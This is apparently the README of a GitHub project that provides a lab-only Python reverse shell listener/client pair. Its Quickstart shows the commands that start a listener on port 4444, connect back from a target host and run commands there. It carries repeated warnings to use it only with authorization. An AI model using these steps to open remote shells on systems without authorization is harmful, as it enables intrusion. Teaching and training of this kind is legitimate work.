> **⚠️ EDUCATIONAL USE ONLY — AUTHORIZED TESTING ONLY.**
> This project exists for education, research, and **defense of systems you own
> or hold explicit written authorization to assess**. Unauthorized use is
> prohibited and may be illegal. Read [ETHICS.md](ETHICS.md) and
> [SCOPE.md](SCOPE.md) before use. Use at your own risk; **AS IS**, no warranty.

# Reverse Shell Lab Tool

Lab-only reverse shell for educational security training — a minimal Python
listener/client pair that demos reverse shell mechanics, interactive remote
command execution, and red-team callback concepts inside isolated lab
environments.

[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](#license)
[![GitHub stars](https://img.shields.io/github/stars/5h4d0wn1k/lab-reverse-shell)](#)
[![Last commit](https://img.shields.io/github/last-commit/5h4d0wn1k/lab-reverse-shell)](#)

> **LAB USE ONLY** — designed for isolated, authorized lab environments. Never
> expose the listener to the internet or run against systems you do not own and
> are not authorized to assess.

## Why this project

Reverse shells are a foundational concept in penetration testing and red-team
operations: a client on the target connects out to a listener, enabling
interactive command execution while bypassing naive network trust boundaries.
Understanding listener/client pairing, command forwarding, and subprocess
execution is essential both for offense (authorized assessments) and for
defense (detecting outbound callback channels). This tool is a minimal, purely
educational implementation for instruction, CTF practice, and lab exercises in
systems you own or hold explicit written authorization to test. The single
dependency-free script makes it easy to read, extend, and reason about
end-to-end.

## Features

- **Listener mode** (`listen`) — binds a TCP socket and serves an interactive
  `shell>` prompt on an accepted connection
- **Client mode** (`connect`) — connects back to a listener and executes
  received commands via `subprocess` on a dedicated thread
- **Interactive remote shell** — bidirectional command/response over one socket
- **Stdlib-only** — uses only `socket`, `subprocess`, `threading`, and
  `argparse`; zero third-party dependencies
- **Lab-safety notices** — prints explicit lab-only warnings on every run
- **Release tracking** — `VERSION` (1.1.0) and `CHANGELOG.md`

## Quickstart

Prerequisites: Python 3.8+ and an isolated lab with two hosts (or VMs).

```bash
# Show CLI help
python3 lab_shell.py --help

# 1) Start the listener on the lab host
python3 lab_shell.py listen --host 0.0.0.0 --port 4444

# 2) Connect from the lab target
python3 lab_shell.py connect --host <lab-ip> --port 4444

# 3) Run commands on the connected client
shell> whoami
shell> ls -la
```

## CLI reference

| Command | Flag | Description |
|---------|------|-------------|
| `listen` | `--host` | Bind address (default `0.0.0.0`) |
| `listen` | `--port` | Listen port (default `4444`) |
| `connect` | `--host` | Listener IP/host (**required**) |
| `connect` | `--port` | Listener port (default `4444`) |

## Project structure

- `lab_shell.py` — the entire listener/client implementation
- `requirements.txt` — no runtime requirements (stdlib only)
- `CHANGELOG.md`, `VERSION` — release history and current version

## Documentation

- [ETHICS.md](ETHICS.md) — intended use, four rules, user responsibility
- [SCOPE.md](SCOPE.md) — authorized-testing checklist
- [SECURITY.md](SECURITY.md) — reporting vulnerabilities in this repo
- [CONTRIBUTING.md](CONTRIBUTING.md) — how to contribute safely

## Contributing

Contributions for legitimate lab and educational use are welcome. Open an issue
or submit a pull request following [CONTRIBUTING.md](CONTRIBUTING.md).

## License

MIT — see [LICENSE](LICENSE). Educational, authorized-use only; provided
**AS IS**, without warranty, for learning and defense of systems you own or are
authorized to test.